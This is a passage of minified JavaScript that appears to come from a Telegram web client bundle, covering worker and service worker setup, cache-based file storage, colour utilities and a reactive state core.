    super("CRYPTO"), (this.lastIndex = -1)
  }
  invokeCryptoNew({ method: e, args: s, transfer: r }) {
    const i = { method: e, args: s },
      n = this.listeners.invoke
    if (n?.length) {
      let c = n[0].callback(i)
      return !re && !(c instanceof Promise) && (c = Promise.resolve(c)), c
    }
    const o =
      e === "aes-encrypt" || e === "aes-decrypt"
        ? (this.lastIndex = (this.lastIndex + 1) % this.sendPorts.length)
        : 0
    return this.invoke("invoke", i, void 0, this.sendPorts[o], r)
  }
  invokeCrypto(e, ...s) {
    return this.invokeCryptoNew({ method: e, args: s })
  }
}
const Me = new Oi()
S && (S.cryptoMessagePort = Me)
function Bi(t) {
  return [
    "image/jpeg",
    "image/png",
    "image/gif",
    "image/svg+xml",
    "image/webp",
    "image/bmp",
    "video/mp4",
    "video/webm",
    "video/quicktime",
    "audio/ogg",
    "audio/mpeg",
    "audio/mp4",
    "audio/wav",
    "application/json",
    "application/pdf",
  ].indexOf(t) === -1
    ? "application/octet-stream"
    : t
}
function xs(t, e = "") {
  Array.isArray(t) || (t = [t])
  const s = Bi(e)
  return new Blob(t, { type: s })
}
class xi {
  constructor(e, s, r) {
    ;(this.mimeType = e),
      (this.size = s),
      (this.saveFileCallback = r),
      (this.bytes = new Uint8Array(s))
  }
  async write(e, s) {
    const r = s + e.byteLength
    if (r > this.bytes.byteLength) {
      const i = new Uint8Array(r)
      i.set(this.bytes, 0), (this.bytes = i)
    }
    this.bytes.set(e, s)
  }
  truncate() {
    this.bytes = new Uint8Array()
  }
  trim(e) {
    this.bytes = this.bytes.slice(0, e)
  }
  finalize(e = !0) {
    const s = xs(this.bytes, this.mimeType)
    return e && this.saveFileCallback && this.saveFileCallback(s), s
  }
  getParts() {
    return this.bytes
  }
  replaceParts(e) {
    this.bytes = e
  }
}
const Ie = class {
  constructor(t) {
    ;(this.dbName = t),
      (this.useStorage = !0),
      Y.test && (this.dbName += "_test"),
      Ie.STORAGES.length && (this.useStorage = Ie.STORAGES[0].useStorage),
      this.openDatabase(),
      Ie.STORAGES.push(this)
  }
  openDatabase() {
    return this.openDbPromise ?? (this.openDbPromise = caches.open(this.dbName))
  }
  delete(t) {
    return this.timeoutOperation((e) => e.delete("/" + t))
  }
  deleteAll() {
    return caches.delete(this.dbName)
  }
  get(t) {
    return this.timeoutOperation((e) => e.match("/" + t))
  }
  save(t, e) {
    return this.timeoutOperation((s) => s.put("/" + t, e))
  }
  getFile(t, e = "blob") {
    return this.get(t).then((s) => {
      if (!s) throw Be("NO_ENTRY_FOUND")
      return s[e]()
    })
  }
  saveFile(t, e) {
    e instanceof Blob || (e = xs(e))
    const s = new Response(e, { headers: { "Content-Length": "" + e.size } })
    return this.save(t, s).then(() => e)
  }
  timeoutOperation(t) {
    return this.useStorage
      ? new Promise(async (e, s) => {
          let r = !1
          const i = setTimeout(() => {
            s(), (r = !0)
          }, 15e3)
          try {
            const n = await this.openDatabase()
            if (!n)
              throw (
                ((this.useStorage = !1),
                (this.openDbPromise = void 0),
                "no cache?")
              )
            const o = await t(n)
            if (r) return
            e(o)
          } catch (n) {
            s(n)
          }
          clearTimeout(i)
        })
      : Promise.reject(Be("STORAGE_OFFLINE"))
  }
  prepareWriting(t, e, s) {
    return {
      deferred: q(),
      getWriter: () => new xi(s, e, (i) => this.saveFile(t, i).catch(() => i)),
    }
  }
  static toggleStorage(t, e) {
    return Promise.all(
      this.STORAGES.map((s) => {
        if (((s.useStorage = t), !!e && !t)) return s.deleteAll()
      })
    )
  }
}
let Ns = Ie
Ns.STORAGES = []
function qt(t, e) {
  return Promise.all([
    Ye.toggleStorage(t, e),
    Ns.toggleStorage(t, e),
    R.toggleStorage(t, e),
  ]).then(ft, ft)
}
class Ni extends wt {
  constructor() {
    super("SERVICE"), S && (S.serviceMessagePort = this)
  }
}
const Wi = "" + new URL("sw-d32a1409.js", import.meta.url).href,
  Ws = ""
function Kt(...t) {
  return t.join(Ws)
}
function Ui(t, e, s, r) {
  const i = e.split(Ws),
    n = i.length
  let o = t
  for (let a = 0; a < n - 1; ++a) {
    const u = i[a]
    o = o[u] ?? (o[u] = {})
  }
  const c = i[n - 1]
  s === void 0 && r ? delete o[c] : (o[c] = s)
}
const Q = "_"
function Vi(t, e) {
  const s = "",
    r = s[s.length - 1] || ""
  let i
  switch (t._) {
    case "inputPhotoFileLocation": {
      i = ["photo", s[0], t.id, t.thumb_size].filter(Boolean).join(Q)
      break
    }
    case "inputDocumentFileLocation": {
      i = ["document", s[0], t.id, t.thumb_size].filter(Boolean).join(Q)
      break
    }
    case "inputPeerPhotoFileLocation":
      i = ["peerPhoto", t.photo_id, t.pFlags.big ? "big" : "small"].join(Q)
      break
    case "inputStickerSetThumb": {
      i = [
        "stickerSetThumb",
        t.stickerset.id ||
          t.stickerset.short_name ||
          t.stickerset.emoticon ||
          t.stickerset._,
        t.thumb_version,
      ].join(Q)
      break
    }
    case "inputFileLocation": {
      i = [t.volume_id, t.local_id].join(Q)
      break
    }
    case "inputWebFileLocation": {
      i = ["webFile", t.url].join(Q)
      break
    }
    case "inputWebFileGeoPointLocation": {
      const n = t.geo_point
      i = ["geoPoint", n.lat, n.long, t.w, t.h, t.zoom, t.scale].join(Q)
      break
    }
    default: {
      console.error("Unrecognized location:", t), (i = "")
      break
    }
  }
  return i + (e?.downloadId ? "_download" : "") + (r && "." + r)
}
function zi(t) {
  return t?._.includes("inputWebFile")
}
function ji(t) {
  return zi(t) ? Vi(t) : t._ + (t.id ?? t.url)
}
function Gi(t) {
  return { downloaded: 0, url: "", type: t }
}
function Yi(t, e) {
  return t + (e !== void 0 ? "-" + e : "")
}
function Hi(t, e) {
  return t instanceof Promise ? t.then(e) : e(t)
}
function Xt(t) {
  return typeof t == "number" && t < dt
}
class $i extends _e {
  constructor() {
    super(),
      (this.onMirrorTask = (e) => {
        var o
        const { name: s, key: r, value: i } = e
        if ((this.processMirrorTaskMap[s]?.(e), !e.hasOwnProperty("key"))) {
          this.mirrors[s] = i
          return
        }
        const n = (o = this.mirrors)[s] ?? (o[s] = {})
        Ui(n, r, i, !0)
      }),
      (this.mirrors = {
        state: void 0,
        thumbs: {},
        stickerThumbs: {},
        availableReactions: void 0,
        messages: {},
        groupedMessages: {},
        peers: {},
        avatars: {},
      }),
      (this.processMirrorTaskMap = {
        messages: (e) => {
          var o
          const s = e.value
          let r, i
          if (s) (r = s.mid), (i = s.grouped_id)
          else {
            const [c, a] = e.key.split(".")
            r = +a
            const u = this.mirrors.messages[c]?.[r]
            if (!u) return
            i = u.grouped_id
          }
          if (!i) return
          const n = (o = this.mirrors.groupedMessages)[i] ?? (o[i] = new Map())
          e.value
            ? n.set(r, s)
            : (n.delete(r), n.size || delete this.mirrors.groupedMessages[i])
        },
      }),
      (this.tabState = { chatPeerIds: [], idleStartTime: 0 }),
      this.log("constructor"),
      this.registerWorker(),
      this.registerServiceWorker(),
      this.registerCryptoWorker(),
      this.addMultipleEventsListeners({
        convertWebp: ({ fileName: e, bytes: s }) => ks.convert(e, s),
        convertOpus: ({ fileName: e, bytes: s }) =>
          Bs.pushDecodeTask(s, !1).then((r) => r.bytes),
        event: ({ name: e, args: s }) => {
          F.dispatchEventSingle(e, ...s)
        },
        localStorageProxy: (e) => {
          const s = e
          return R[s.type](...s.args)
        },
        mirror: this.onMirrorTask,
      }),
      F.addEventListener("language_change", (e) => {
        F.managers.networkerFactory.setLanguage(e),
          F.managers.appAttachMenuBotsManager.onLanguageChange()
      }),
      window.addEventListener("online", () => {
        F.managers.networkerFactory.forceReconnectTimeout()
      }),
      F.addEventListener("logging_out", () => {
        const e = ["cachedFiles", "cachedStreamChunks"]
        Promise.all([
          qt(!1, !0),
          R.clear(),
          Promise.race([kt.setAuthorized(!1), ls(3e3)]),
          Ve.forceUnsubscribe(),
          Promise.all(e.map((s) => caches.delete(s))),
        ]).finally(() => {
          Ps.reload()
        })
      }),
      We.addEventListener("change", (e) => {
        this.updateTabStateIdle(e)
      }),
      this.updateTabStateIdle(We.isIdle),
      this.log("Passing environment:", Yt),
      this.invoke("environment", Yt)
  }
  pingServiceWorkerWithIframe() {
    if (this.pingServiceWorkerPromise) return this.pingServiceWorkerPromise
    const e = (this.pingServiceWorkerPromise = q()),
      s = document.createElement("iframe")
    s.hidden = !0
    const r = () => {
      setTimeout(() => {
        this.pingServiceWorkerPromise = void 0
      }, 1e4),
        clearTimeout(i),
        s.remove(),
        s.removeEventListener("load", r),
        s.removeEventListener("error", r),
        e.resolve()
    }
    s.addEventListener("load", r),
      s.addEventListener("error", r),
      (s.src = "ping/" + ((Math.random() * 4294967295) | 0) + ".nocache"),
      document.body.append(s)
    const i = window.setTimeout(r, 1e3)
    return e
  }
  attachServiceWorker(e) {
    if (this.lastServiceWorker === e) {
      this.log.warn("trying to attach same service worker")
      return
    }
    this.lastServiceWorker &&
      this.serviceMessagePort.detachPort(this.lastServiceWorker),
      this.serviceMessagePort.attachSendPort((this.lastServiceWorker = e)),
      this.serviceMessagePort.invokeVoid("hello", void 0)
  }
  _registerServiceWorker() {
    navigator.serviceWorker
      .register(Wi, { type: "module", scope: "./" })
      .then((e) => {
        this.log("SW registered", e)
        const s = new URL(window.location.href),
          r = "swfix",
          i = +s.searchParams.get(r) || 0
        if (e.active && !navigator.serviceWorker.controller) {
          if (i >= 3) throw new Error("no controller")
          return e.unregister().then(() => {
            s.searchParams.set(r, "" + (i + 1)),
              (window.location.href = s.toString())
          })
        }
        i && (s.searchParams.delete(r), history.pushState(void 0, "", s)),
          (e.installing || e.waiting || e.active).addEventListener(
            "statechange",
            (c) => {
              this.log("SW statechange", c)
            }
          )
        const o =
          navigator.serviceWorker.controller ||
          e.installing ||
          e.waiting ||
          e.active
        this.attachServiceWorker(o)
      })
      .catch((e) => {
        this.log.error("SW registration failed!", e),
          this.invokeVoid("serviceWorkerOnline", !1)
      })
  }
  registerServiceWorker() {
    if (!("serviceWorker" in navigator)) return
    this.serviceMessagePort = Ve.serviceMessagePort = new Ni()
    const e = navigator.serviceWorker
    this._registerServiceWorker(),
      e.addEventListener("controllerchange", () => {
        this.log.warn("controllerchange")
        const s = e.controller
        this.attachServiceWorker(s),
          s.addEventListener("error", (r) => {
            this.log.error("controller error:", r)
          })
      }),
      this.serviceMessagePort.attachListenPort(e),
      this.serviceMessagePort.addMultipleEventsListeners({
        port: (s, r, i) => {
          this.invokeVoid("serviceWorkerPort", void 0, void 0, [i.ports[0]])
        },
        hello: (s, r) => {
          this.serviceMessagePort.resendLockTask(r)
        },
        share: (s) => {
          this.log("will try to share something"), (this.share = s)
        },
      }),
      e.addEventListener("messageerror", (s) => {
        this.log.error("SW messageerror:", s)
      })
  }
  async registerCryptoWorker() {
    const e = (D) =>
        fetch(D)
          .then((w) => w.text())
          .then((w) => {
            const b = location.pathname.split("/")
            b[b.length - 1] = ""
            const g = location.origin + b.join("/")
            return (
              (w = w.replace(/(import (?:.+? from )?['"])\//g, "$1" + g)),
              new Blob([w], { type: "application/javascript" })
            )
          }),
      s = {
        construct(D, w) {
          return { url: hs(w[0]).toString() }
        },
      },
      r = [Worker, typeof SharedWorker < "u" && SharedWorker].filter(Boolean)
    r.forEach((D) => (window[D.name] = new Proxy(D, s)))
    const i = new Worker(
      new URL(
        "" + new URL("crypto.worker-b2b2021e.js", import.meta.url).href,
        self.location
      ),
      { type: "module" }
    )
    r.forEach((D) => (window[D.name] = D))
    const n = i.url,
      o = (D) => new a(D, { type: "module" }),
      c = (D) => this.attachWorkerToPort(D, Me, "crypto"),
      a = Ne ? SharedWorker : Worker
    Me.addEventListener("port", (D, w, b) => {
      this.invokeVoid("cryptoPort", void 0, void 0, [b.ports[0]])
    })
    const u = o(n)
    c(u)
    const h = await e(n)
    ;(await this.invoke("createProxyWorkerURLs", { originalUrl: n, blob: h }))
      .slice(1)
      .map(o)
      .forEach(c)
  }
  registerWorker() {
    let e
    Ne
      ? (e = new SharedWorker(
          new URL(
            "" + new URL("mtproto.worker-053515b0.js", import.meta.url).href,
            self.location
          ),
          { type: "module" }
        ))
      : (e = new Worker(
          new URL(
            "" + new URL("mtproto.worker-053515b0.js", import.meta.url).href,
            self.location
          ),
          { type: "module" }
        )),
      this.onWorkerFirstMessage(e)
  }
  attachWorkerToPort(e, s, r) {
    const i = e.port || e
    s.attachPort(i),
      e.addEventListener("error", (n) => {
        this.log.error(r, "worker error", n)
      })
  }
  onWorkerFirstMessage(e) {
    this.log("set webWorker"), this.attachWorkerToPort(e, this, "mtproto")
  }
  loadState() {
    return Promise.all([
      Ii().then(
        (e) => (
          (this.newVersion = e.newVersion),
          (this.oldVersion = e.oldVersion),
          (this.mirrors.state = e.state),
          e
        )
      ),
    ])
  }
  sendState() {
    return this.loadState().then((e) => {
      const [s] = e
      return this.invoke("state", { ...s, userId: F.myId.toUserId() }), e
    })
  }
  invokeCrypto(e, ...s) {
    return Me.invokeCrypto(e, ...s)
  }
  async toggleStorages(e, s) {
    await qt(e, s),
      this.invoke("toggleStorages", { enabled: e, clearWrite: s }),
      this.serviceMessagePort?.invokeVoid("toggleStorages", {
        enabled: e,
        clearWrite: s,
      })
  }
  async getMirror(e) {
    return this.mirrors[e]
  }
  getState() {
    return this.getMirror("state")
  }
  getCacheContext(e, s = gr, r = ji(e)) {
    return this.mirrors.thumbs[r]?.[s] || Gi(s)
  }
  getStickerCachedThumb(e, s) {
    const r = Yi(e, s)
    return this.mirrors.stickerThumbs[r]
  }
  getAvailableReactions() {
    var e
    return (
      (e = this.mirrors).availableReactions ||
      (e.availableReactions =
        F.managers.appReactionsManager.getAvailableReactions())
    )
  }
  getReaction(e) {
    return Hi(this.getAvailableReactions(), (s) =>
      s.find((r) => r.reaction === e)
    )
  }
  async getMessageFromStorage(e, s) {
    return (
      e.endsWith("history") &&
        Xt(s) &&
        (e = this.getGlobalHistoryMessagesStorage()),
      this.mirrors.messages[e]?.[s]
    )
  }
  getGroupsFirstMessage(e) {
    if (!e?.grouped_id) return e
    const s = this.mirrors.groupedMessages[e.grouped_id]
    let r = Number.MAX_SAFE_INTEGER
    for (const [i, n] of s) n.mid < r && (r = n.mid)
    return s.get(r)
  }
  getHistoryMessagesStorage(e) {
    return `${e}_history`
  }
  getGlobalHistoryMessagesStorage() {
    return this.getHistoryMessagesStorage(ds)
  }
  getMessageById(e) {
    if (Xt(e))
      return this.getMessageFromStorage(
        this.getGlobalHistoryMessagesStorage(),
        e
      )
  }
  getMessageByPeer(e, s) {
    return e
      ? this.getMessageFromStorage(this.getHistoryMessagesStorage(e), s)
      : this.getMessageById(s)
  }
  getPeer(e) {
    return this.mirrors.peers[e]
  }
  getUser(e) {
    return this.mirrors.peers[e.toPeerId(!1)]
  }
  getChat(e) {
    return this.mirrors.peers[e.toPeerId(!0)]
  }
  isForum(e) {
    return !!this.getPeer(e)?.pFlags?.forum
  }
  isAvatarCached(e, s) {
    const r = this.mirrors.avatars[e]
    return s === void 0 ? !!r : !!(r && r[s] && !(r[s] instanceof Promise))
  }
  loadAvatar(e, s, r) {
    var n
    const i = (n = this.mirrors.avatars)[e] ?? (n[e] = {})
    return i[r] ?? (i[r] = F.managers.appAvatarsManager.loadAvatar(e, s, r))
  }
  updateTabState(e, s) {
    ;(this.tabState[e] = s), this.invokeVoid("tabState", this.tabState)
  }
  updateTabStateIdle(e) {
    this.updateTabState("idleStartTime", e ? Date.now() : 0)
  }
}
const Us = new $i()
S.apiManagerProxy = Us
const $e = Us,
  qi = {}
function Ki(t, e) {
  return new Proxy(
    {},
    {
      get:
        (r, i, n) =>
        (...o) => {
          const c = $e.invoke("manager", { name: t, method: i, args: o }, e)
          return (
            se && qi[t]?.has(i) && console.warn("manager request", t, i, o, e),
            c
          )
        },
    }
  )
}
function Jt(t, e) {
  return new Proxy(t, { get: (s, r, i) => s[r] ?? (s[r] = Ki(r, e)) })
}
let me
function Xi() {
  return me || ((me = Jt({}, !1)), (me.acknowledged = Jt({}, !0)), me)
}
function Ji(t, e, s) {
  return Math.min(s, Math.max(e, t))
}
function J(t, e, s) {
  ;(t /= 255), (e /= 255), (s /= 255)
  const r = Math.max(t, e, s),
    i = r - Math.min(t, e, s),
    n =
      i && (r === t ? (e - s) / i : r == e ? 2 + (s - t) / i : 4 + (t - e) / i)
  return [60 * (n < 0 ? n + 6 : n), r && i / r, r]
}
function At(t, e, s) {
  const r = (i, n = (i + t / 60) % 6) =>
    Math.round((s - s * e * Math.max(Math.min(n, 4 - n, 1), 0)) * 255)
  return [r(5), r(3), r(1)]
}
function Zt(t, e, s, r = 1) {
  ;(t /= 255), (e /= 255), (s /= 255)
  const i = Math.max(t, e, s),
    n = Math.min(t, e, s)
  let o, c
  const a = (i + n) / 2
  if (i === n) o = c = 0
  else {
    const u = i - n
    switch (((c = a > 0.5 ? u / (2 - i - n) : u / (i + n)), i)) {
      case t:
        o = (e - s) / u + (e < s ? 6 : 0)
        break
      case e:
        o = (s - t) / u + 2
        break
      case s:
        o = (t - e) / u + 4
        break
    }
    o /= 6
  }
  return { h: o * 360, s: c * 100, l: a * 100, a: r }
}
function Vs(t, e, s, r) {
  ;(t /= 360), (e /= 100), (s /= 100)
  let i, n, o
  if (e === 0) i = n = o = s
  else {
    const c = function (m, v, D) {
        return (
          D < 0 && (D += 1),
          D > 1 && (D -= 1),
          D < 0.16666666666666666
            ? m + (v - m) * 6 * D
            : D < 0.5
            ? v
            : D < 0.6666666666666666
            ? m + (v - m) * (0.6666666666666666 - D) * 6
            : m
        )
      },
      a = s < 0.5 ? s * (1 + e) : s + e - s * e,
      u = 2 * s - a
    ;(i = c(u, a, t + 1 / 3)), (n = c(u, a, t)), (o = c(u, a, t - 1 / 3))
  }
  return [i, n, o, r].map((c) => Math.round(c * 255))
}
function zs(t) {
  const e = t.slice(5, -1).split(", "),
    s = +e.pop(),
    r = e.map((i) => (i.endsWith("%") ? +i.slice(0, -1) : +i))
  return Vs(r[0], r[1], r[2], s)
}
function Zi(t) {
  const e = [],
    s = t[0] === "#" ? 1 : 0
  if (
    (t.length === 5 + s && (t = (s ? "#" : "") + "0" + t.slice(s)),
    t.length === 3 + s)
  )
    for (let r = s; r < t.length; ++r) e.push(parseInt(t[r] + t[r], 16))
  else if (t.length === 4 + s) {
    for (let r = s; r < t.length - 1; ++r) e.push(parseInt(t[r] + t[r], 16))
    e.push(parseInt(t[t.length - 1], 16))
  } else
    for (let r = s; r < t.length; r += 2)
      e.push(parseInt(t.slice(r, r + 2), 16))
  return e
}
function X(t) {
  return Zi(t.slice(0, 7))
}
function Ee(t) {
  return "#" + t.map((e) => ("0" + e.toString(16)).slice(-2)).join("")
}
function Qi(t) {
  return Ee(zs(t))
}
function en(t) {
  return Qi(t).slice(0, -2)
}
function rt(t, e, s) {
  const r = new Array(3)
  for (let i = 0; i < 3; ++i) {
    const n = t[i],
      o = e[i]
    r[i] = Math.floor(o + (n - o) * s)
  }
  return r
}
function Qt(t) {
  return (t[0] * 0.2126 + t[1] * 0.7152 + t[2] * 0.0722) / 255
}
function tn(t, e) {
  return t.map((s, r) => Math.round((s + e[r]) / 2))
}
function sn(t, e, s) {
  const r = J(...e),
    i = J(...s),
    n = Math.min((1.5 * r[1]) / t[1], 1)
  return (
    (r[0] = Math.min(360, i[0] - r[0] + t[0])),
    (r[1] = Math.min(1, (i[1] * t[1]) / r[1])),
    (r[2] = Math.min(1, ((i[2] / r[2] + n - 1) * t[2]) / n)),
    r[2] < 0.3 ? s : At(...r)
  )
}
function rn(t, e, s, r) {
  const i = J(...s)
  if (Math.min(Math.abs(i[0] - t[0]), Math.abs(i[0] - t[0] - 360)) > 30)
    return s
  const o = t[1] ? Math.min((1.5 * i[1]) / t[1], 1) : 0
  ;(i[0] = Math.min(360, i[0] + e[0] - t[0])),
    (i[1] = t[1] ? Math.min(1, (i[1] * e[1]) / t[1]) : 0),
    (i[2] = t[2] ? Math.min(1, i[2] * (1 - o + (o * e[2]) / t[2])) : 0)
  let c = At(...i)
  const a = Qt(s),
    u = Qt(c)
  if (r ? a > u : a < u) {
    const v = (0.4 * a) / u + 0.6
    c = nn(c, v)
  }
  return c
}
function nn(t, e) {
  return t.map((s) => Ji(Math.round(s * e), 0, 255))
}
function on(t) {
  const e = (t < 0 ? 16777215 + t : t).toString(16)
  return "#" + (e.length >= 6 ? e : "0".repeat(6 - e.length) + e)
}
function Te(t) {
  return X(on(t))
}
function js(t, e, s, r, i = !0) {
  if (t < s && e < r && i) return C(t, e)
  let n = s,
    o = r
  return (
    t / e > s / r
      ? (o = ((e * s) / t) | 0)
      : ((n = ((t * r) / e) | 0), n > s && ((o = ((o * s) / n) | 0), (n = s))),
    i && n >= t && o >= e && ((n = t), (o = e)),
    C(n, o)
  )
}
S.calcImageInBox = js
class an {
  constructor(e = 0, s = e) {
    ;(this.width = e), (this.height = s)
  }
  aspect(e, s) {
    return js(this.width, this.height, e.width, e.height, s)
  }
  aspectFitted(e) {
    return this.aspect(e, !0)
  }
  aspectCovered(e) {
    return this.aspect(e, !1)
  }
}
function C(t, e) {
  return new an(t, e)
}
const cn = 600,
  un = 1275,
  ln = 1680,
  es = C(20, 20),
  ts = C(36, 36),
  ss = C(18, 18)
class hn extends ne {
  constructor() {
    super(),
      (this.screenSizes = [
        { key: 0, value: cn },
        { key: 1, value: un },
        { key: 2, value: ln },
      ]),
      (this.sizes = {
        handhelds: {
          regular: C(270, 270),
          webpage: C(270, 200),
          album: C(270, 0),
          esgSticker: C(68, 68),
          animatedSticker: C(180, 180),
          staticSticker: C(180, 180),
          emojiSticker: C(112, 112),
          poll: C(240, 0),
          round: C(240, 240),
          documentName: C(200, 0),
          invoice: C(270, 270),
          extendedInvoice: C(270, 270),
          customEmoji: es,
          esgCustomEmoji: ts,
          emojiStatus: ss,
          popupSticker: C(68, 68),
        },
        desktop: {
          regular: C(420, 340),
          webpage: C(420, 340),
          album: C(420, 0),
          esgSticker: C(72, 72),
          animatedSticker: C(200, 200),
          staticSticker: C(200, 200),
          emojiSticker: C(112, 112),
          poll: C(330, 0),
          round: C(280, 280),
          documentName: C(240, 0),
          invoice: C(320, 320),
          extendedInvoice: C(420, 340),
          customEmoji: es,
          esgCustomEmoji: ts,
          emojiStatus: ss,
          popupSticker: C(80, 80),
        },
      }),
      (this.isMobile = !1),
      (this.handleResize = () => {
        const e = window.innerWidth
        let s = this.screenSizes[0].key
        for (let i = this.screenSizes.length - 1; i >= 0; --i)
          if (this.screenSizes[i].value < e) {
            s = (this.screenSizes[i + 1] || this.screenSizes[i]).key
            break
          }
        const r = this.activeScreen
        ;(this.activeScreen = s),
          (this.isMobile = this.activeScreen === 0),
          (this.active = this.isMobile
            ? this.sizes.handhelds
            : this.sizes.desktop),
          r !== s && r !== void 0 && this.dispatchEvent("changeScreen", r, s),
          r !== void 0 && this.dispatchEvent("resize")
      }),
      window.addEventListener("resize", () => {
        this.rAF && window.cancelAnimationFrame(this.rAF),
          (this.rAF = window.requestAnimationFrame(() => {
            this.handleResize(), (this.rAF = 0)
          }))
      }),
      this.handleResize()
  }
}
const Gs = new hn()
S.mediaSizes = Gs
class dn {
  constructor() {
    ;(this.resetCache = () => {
      this.computedStyle = void 0
      const e = this.cache
      this.cache = {}
      for (const s in e) this.getProperty(s)
    }),
      (this.cache = {}),
      (this.nightElement = document.createElement("div")),
      (this.nightElement.className = "night"),
      (this.nightElement.style.display = "none"),
      document.body.append(this.nightElement),
      F.addEventListener("theme_changed", this.resetCache),
      Gs.addEventListener("resize", this.resetCache)
  }
  getProperty(e, s) {
    const r = this.cache[e],
      i = s ? 1 : 0
    if (r?.[i]) return r[i]
    this.computedStyle ??
      (this.computedStyle = window.getComputedStyle(document.documentElement)),
      this.nightComputedStyle ??
        (this.nightComputedStyle = window.getComputedStyle(this.nightElement))
    const n = (s ? this.nightComputedStyle : this.computedStyle)
      .getPropertyValue("--" + e)
      .trim()
    return this.setPropertyCache(e, n, s)
  }
  getPropertyAsColor(e) {
    const s = this.getProperty(e)
    return s[0] === "#" ? s : `rgb(${s})`
  }
  getPropertyAsSize(e) {
    const s = this.getProperty(e)
    let r
    return (
      s[s.length - 1] === "%" ||
        (s.indexOf("rem")
          ? (r = +s.replace("rem", "") * 16)
          : (r = +s.replace("px", ""))),
      r
    )
  }
  setPropertyCache(e, s, r) {
    var i
    return (((i = this.cache)[e] ?? (i[e] = []))[r ? 1 : 0] = s)
  }
}
const Ft = new dn()
S && (S.customProperties = Ft)
const fn = (t, e) => t === e,
  rs = { equals: fn }
let gn = qs
const we = 1,
  ze = 2
var Re = null
let it = null,
  O = null,
  x = null,
  te = null,
  qe = 0
function Dn(t, e) {
  e = e ? Object.assign({}, rs, e) : rs
  const s = {
      value: t,
      observers: null,
      observerSlots: null,
      comparator: e.equals || void 0,
    },
    r = (i) => (typeof i == "function" && (i = i(s.value)), Ys(s, i))
  return [pn.bind(s), r]
}
function mn(t) {
  if (O === null) return t()
  const e = O
  O = null
  try {
    return t()
  } finally {
    O = e
  }
}
function pn() {
  if (this.sources && this.state)
    if (this.state === we) Hs(this)
    else {
      const t = x
      ;(x = null), Ke(() => je(this), !1), (x = t)
    }
  if (O) {
    const t = this.observers ? this.observers.length : 0
    O.sources
      ? (O.sources.push(this), O.sourceSlots.push(t))
      : ((O.sources = [this]), (O.sourceSlots = [t])),
      this.observers
        ? (this.observers.push(O),
          this.observerSlots.push(O.sources.length - 1))
        : ((this.observers = [O]),
          (this.observerSlots = [O.sources.length - 1]))
  }
  return this.value
}
function Ys(t, e, s) {
  let r = t.value
  return (
    (!t.comparator || !t.comparator(r, e)) &&
      ((t.value = e),
      t.observers &&
        t.observers.length &&
        Ke(() => {
          for (let i = 0; i < t.observers.length; i += 1) {
            const n = t.observers[i],
              o = it && it.running
            o && it.disposed.has(n),
              (o ? !n.tState : !n.state) &&
                (n.pure ? x.push(n) : te.push(n), n.observers && Ks(n)),
              o || (n.state = we)
          }
          if (x.length > 1e6) throw ((x = []), new Error())
        }, !1)),
    e
  )
}
function Hs(t) {
  if (!t.fn) return
  Lt(t)
  const e = Re,
    s = O,
    r = qe
  ;(O = Re = t), Fn(t, t.value, r), (O = s), (Re = e)
}
function Fn(t, e, s) {
  let r
  try {
    r = t.fn(e)
  } catch (i) {
    return (
      t.pure &&
        ((t.state = we), t.owned && t.owned.forEach(Lt), (t.owned = null)),
      (t.updatedAt = s + 1),
      Xs(i)
    )
  }
  ;(!t.updatedAt || t.updatedAt <= s) &&
    (t.updatedAt != null && "observers" in t ? Ys(t, r) : (t.value = r),
    (t.updatedAt = s))
}
function $s(t) {
  if (t.state === 0) return
  if (t.state === ze) return je(t)
  if (t.suspense && mn(t.suspense.inFallback)) return t.suspense.effects.push(t)
  const e = [t]
  for (; (t = t.owner) && (!t.updatedAt || t.updatedAt < qe); )
    t.state && e.push(t)
  for (let s = e.length - 1; s >= 0; s--)
    if (((t = e[s]), t.state === we)) Hs(t)
    else if (t.state === ze) {
      const r = x
      ;(x = null), Ke(() => je(t, e[0]), !1), (x = r)
    }
}
function Ke(t, e) {
  if (x) return t()
  let s = !1
  e || (x = []), te ? (s = !0) : (te = []), qe++
  try {
    const r = t()
    return En(s), r
  } catch (r) {
    s || (te = null), (x = null), Xs(r)
  }
}
function En(t) {
  if ((x && (qs(x), (x = null)), t)) return
  const e = te
  ;(te = null), e.length && Ke(() => gn(e), !1)
}
function qs(t) {
  for (let e = 0; e < t.length; e++) $s(t[e])
}
function je(t, e) {
  t.state = 0
  for (let s = 0; s < t.sources.length; s += 1) {
    const r = t.sources[s]
    if (r.sources) {
      const i = r.state
      i === we
        ? r !== e && (!r.updatedAt || r.updatedAt < qe) && $s(r)
        : i === ze && je(r, e)
    }
  }
}
function Ks(t) {
  for (let e = 0; e < t.observers.length; e += 1) {
    const s = t.observers[e]
    s.state ||
      ((s.state = ze), s.pure ? x.push(s) : te.push(s), s.observers && Ks(s))
  }
}
function Lt(t) {
  let e
  if (t.sources)
    for (; t.sources.length; ) {
      const s = t.sources.pop(),
        r = t.sourceSlots.pop(),
        i = s.observers
      if (i && i.length) {
        const n = i.pop(),
          o = s.observerSlots.pop()
        r < i.length &&
          ((n.sourceSlots[o] = r), (i[r] = n), (s.observerSlots[r] = o))
      }
    }
  if (t.owned) {
    for (e = t.owned.length - 1; e >= 0; e--) Lt(t.owned[e])
    t.owned = null
  }
  if (t.cleanups) {
    for (e = t.cleanups.length - 1; e >= 0; e--) t.cleanups[e]()
    t.cleanups = null
  }
  t.state = 0
}
function vn(t) {
  return t instanceof Error
    ? t
    : new Error(typeof t == "string" ? t : "Unknown error", { cause: t })
}
function Xs(t, e = Re) {
  const s = vn(t)
  {
    console.error("solid error", s)
    return
  }
}
function is(...t) {
  const [e, s] = Dn(...t)
  return (...r) => (r.length === 0 ? e() : s(...r))
}
class yn {
  constructor() {
    if (re) return
    ;(this._width = is()), (this._height = is()), (this.viewport = window)
    const e = () => {
      this.setDimensions()
    }
    this.viewport.addEventListener("resize", e), e()
  }
  setDimensions() {
    const e = this.viewport
    this._width(e.width || e.innerWidth),
      this._height(e.height || e.innerHeight)
  }
  get width() {
    return this._width()
  }
  get height() {
    return this._height()
  }
}
const Et = new yn()
S && (S.windowSize = Et)
class Sn {
  isEnabled() {
    return !!(F.settings && F.settings.liteMode.all)
  }
  isAvailable(e) {
    return !!(F.settings && !F.settings.liteMode.all && !F.settings.liteMode[e])
  }
}
const Js = new Sn()
S && (S.liteMode = Js)
const ns = {
    "primary-color": {
      rgb: !0,
      light: !0,
      lightFilled: !0,
      dark: !0,
      darkRgb: !0,
    },
    "message-out-primary-color": { lightFilled: !0, rgb: !0 },
    "surface-color": { rgb: !0 },
    "danger-color": { rgb: !0, light: !0, dark: !0 },
    "primary-text-color": { rgb: !0 },
